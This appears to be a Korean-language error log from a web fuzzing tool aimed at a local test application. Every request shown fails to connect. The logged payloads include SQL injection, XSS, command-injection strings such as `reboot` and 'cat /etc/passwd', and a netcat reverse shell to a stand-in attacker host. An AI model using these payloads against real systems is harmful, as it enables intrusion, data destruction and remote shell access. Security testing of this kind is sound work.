2024-10-30 20:32:57,457 - ERROR - robots.txt 접근 실패 - 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: /robots.txt (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x105393740>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:33:06,451 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' /*', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,451 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' ({', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/login, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '; ls', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: ''; DROP TABLE users; --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,452 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '' OR '1'='1' ({', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '; ls', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,453 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '' OR '1'='1' /*', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: ''; DROP TABLE users; --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' ({', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' /*', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,454 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,455 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/add, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,455 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '; ls', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,455 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,455 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,455 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,455 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,456 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,456 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,456 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,456 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,456 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' ({', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' /*', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: ''; DROP TABLE users; --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,457 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '; ls', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,458 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,459 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,459 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,459 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,459 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/posts/add, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
